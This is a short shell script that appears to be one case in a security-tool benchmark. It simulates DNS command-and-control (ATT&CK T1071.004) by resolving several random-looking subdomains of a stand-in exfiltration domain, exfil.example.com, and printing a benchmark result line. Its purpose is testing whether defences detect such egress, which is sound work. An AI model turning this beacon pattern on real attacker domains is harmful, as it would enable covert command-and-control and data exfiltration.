#!/usr/bin/env sh
# Tactic: Command and Control (TA0011)
# Technique: Application Layer Protocol - DNS (T1071.004)
# Attack: emit a burst of DNS lookups for random subdomains of an attacker
# domain (DNS-tunnel / beacon shape). nginx resolves only its own dependencies.
# Uses a documentation domain (example.com) so nothing real is contacted.
# Marker: outcome=attempted (DNS resolution; judge blocking via tool logs).
set -u
TAG="21-dns-egress"
KIND="attack"
rc=0
i=0
while [ "$i" -lt 5 ]; do
  host="d$i.exfil.example.com"
  if command -v getent >/dev/null 2>&1; then
    timeout 2 getent hosts "$host" >/dev/null 2>&1 || true
  elif command -v nslookup >/dev/null 2>&1; then
    timeout 2 nslookup "$host" >/dev/null 2>&1 || true
  fi
  i=$((i + 1))
done
OUT="attempted"
printf 'BENCH_RESULT tag=%s kind=%s outcome=%s rc=%s\n' "$TAG" "$KIND" "$OUT" "$rc"
